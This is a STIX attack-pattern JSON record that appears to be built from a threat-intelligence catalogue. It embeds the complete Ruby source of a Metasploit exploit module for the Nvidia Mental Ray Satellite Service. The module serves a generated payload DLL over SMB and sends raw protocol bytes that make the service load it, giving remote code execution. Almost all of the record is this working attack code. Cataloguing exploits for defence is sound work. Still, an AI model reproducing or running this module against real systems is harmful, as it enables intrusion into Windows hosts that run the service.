{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--afb0e43c-f036-4b46-8d3e-2fd82f0deaad",
    "created": "2024-08-14T16:46:56.991244Z",
    "modified": "2024-08-14T16:46:56.991248Z",
    "name": "Nvidia Mental Ray Satellite Service Arbitrary DLL Injection",
    "description": " The Nvidia Mental Ray Satellite Service listens for control commands on port 7414. When it receives the command to load a DLL (via an UNC path) it will try to connect back to the host on port 7514. If a TCP connection is successful it will then attempt to load the DLL. This module has been tested successfully on Win7 x64 with Nvidia Mental Ray Satellite Service v3.11.1.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/nvidia_mental_ray.rb",
            "external_id": "nvidia_mental_ray.rb"
        },
        {
            "source_name": "reference",
            "url": "http://revuln.com/files/ReVuln_NVIDIA_mental_ray.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Nvidia Mental Ray Satellite Service Arbitrary DLL Injection',\n      'Description' => %q{\n        The Nvidia Mental Ray Satellite Service listens for control commands on port 7414.\n        When it receives the command to load a DLL (via an UNC path) it will try to\n        connect back to the host on port 7514. If a TCP connection is successful it will\n        then attempt to load the DLL. This module has been tested successfully on Win7 x64\n        with Nvidia Mental Ray Satellite Service v3.11.1.\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Luigi Auriemma', # Discovery\n          'Donato Ferrante', # Discovery\n          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit Module\n        ],\n      'References' =>\n        [\n          [ 'URL', 'http://revuln.com/files/ReVuln_NVIDIA_mental_ray.pdf' ],\n          [ 'OSVDB', '100827' ]\n        ],\n      'Stance' => Msf::Exploit::Stance::Aggressive,\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows x64', { 'Arch' => [ ARCH_X64 ] } ]\n        ],\n      'Privileged' => true,\n      'DisclosureDate' => '2013-12-10',\n      'DefaultTarget' => 0))\n\n    register_options([\n      Opt::RPORT(7414),\n      OptInt.new('LISTEN_PORT', [ true, 'The port to catch the return connection on', 7514]),\n      OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 15])\n    ])\n\n    deregister_options('FILE_CONTENTS', 'FILE_NAME', 'SHARE', 'FOLDER_NAME')\n  end\n\n  def primer\n    self.file_contents = generate_payload_dll\n    print_status(\"File available on #{unc}...\")\n\n    print_status(\"Trying to execute remote DLL...\")\n    send_exploit\n  end\n\n  def setup\n    super\n\n    # These lengths are required, although we specify the UNC path\n    # length in the exploit, the header probably has another length\n    # value we don't adjust.\n    self.file_name = \"#{Rex::Text.rand_text_alpha(7)}.dll\"\n    self.share = Rex::Text.rand_text_alpha(5)\n  end\n\n  def exploit\n    begin\n      Timeout.timeout(datastore['SMB_DELAY']) { super }\n    rescue Timeout::Error\n      # do nothing... just finish exploit and stop smb server...\n    end\n  end\n\n  def send_exploit\n    # No idea what most of this hello is...\n    hello = \"6c72696d3030303030203030303031203136333932203037353134203030303031203039303936203030303030207261796d7\"\n    hello << \"36734302d332e31312e312e345f5f5f5f5f5f5f5f5f5f5f5f0020007c5241593331317c53554231000100000000e90300000\"\n    hello << \"0000000ffffffffffffffff1807000000000000dc10d7fdfe0700003018a40500000000e73654fffe070000c0afcd0000000\"\n    hello << \"000ffffffffffffffffffffffffffffffff18070000000000007014a70100000000763754fffe0700000000000000000000f\"\n    hello << \"035ae01000000003036ae0100000000da2152fffe0700003036ae0100000000a33754fffe070000000000000000000000000\"\n    hello << \"00000000000ffffffffffffffffffffffffffffffff3036ae0100000000c40e53fffe0700007014a70100000000180700000\"\n    hello << \"0000000000000000000000000000000000000000000000000000000020000000000000001000000000000005035440400000\"\n    hello << \"0008013a7010000000090b3cd00000000001807000000000000b929d80300000000000000000000000018070000000000009\"\n    hello << \"0b3cd000000000010cda701000000000000000000000000010100000000000000b3cd0000000000060000000000000066000\"\n    hello << \"200000000000000020000000a0008000000a01a0fe73d00cf118ca300804034ae01000000000100000000000000000000000\"\n    hello << \"0000000030000000a000000\"\n\n    hello = Rex::Text.hex_to_raw(hello)\n\n    # Start of command - again no idea what this is...\n    load_dll =  Rex::Text.hex_to_raw(\"4ed32cb1740500000000000001130013\")\n\n    # Length of path string including null byte\n    load_dll << [unc.length + 1].pack('V')\n\n    # Data type?\n    load_dll << [2].pack('V')\n\n    # Assembly Load?\n    load_dll << \"AL\"\n    load_dll << unc << \"\\x00\"\n\n    # Some padding at the end...\n    load_dll << rand_text_alpha(1386 - unc.length)\n\n    # We have to start a second listening port although we dont actually care about\n    # handling client connections. It appears as long as the service can make a\n    # connection its happy and will move onto the DLL loading\n    create_listen_port\n    vprint_status(\"Connecting to target and sending commands\")\n    connect\n    sock.put(hello)\n    sock.put(load_dll)\n    print_status(\"Instructed the service to load #{unc}...\")\n  end\n\n  def create_listen_port\n    port = datastore['LISTEN_PORT']\n\n    comm = datastore['ListenerComm']\n    if comm == \"local\"\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    @listener = Rex::Socket::TcpServer.create(\n        'LocalHost' => datastore['SRVHOST'],\n        'LocalPort' => port,\n        'Comm'      => comm,\n        'Context'   => {\n          'Msf'        => framework,\n          'MsfExploit' => self\n        }\n    )\n\n    # Register callbacks\n    @listener.on_client_connect_proc = proc { |cli|\n      add_socket(cli)\n      begin\n        print_status(\"#{cli.peerhost.ljust(16)} #{shortname} - Connected to Listener on #{port}...\")\n      ensure\n        # Need to close the socket for the SMB request to be\n        # initiated...\n        remove_socket(cli)\n      end\n    }\n\n    @listener.start\n    vprint_status(\"Started listening on TCP port #{port}\")\n  end\n\n  def cleanup\n    super\n    return unless @listener\n\n    begin\n      @listener.deref if @listener.is_a?(Rex::Service)\n      if @listener.is_a?(Rex::Socket)\n        @listener.close\n        @listener.stop\n      end\n      @listener = nil\n    rescue ::Exception\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-10",
    "x_mitre_platforms": [
        "win'"
    ]
}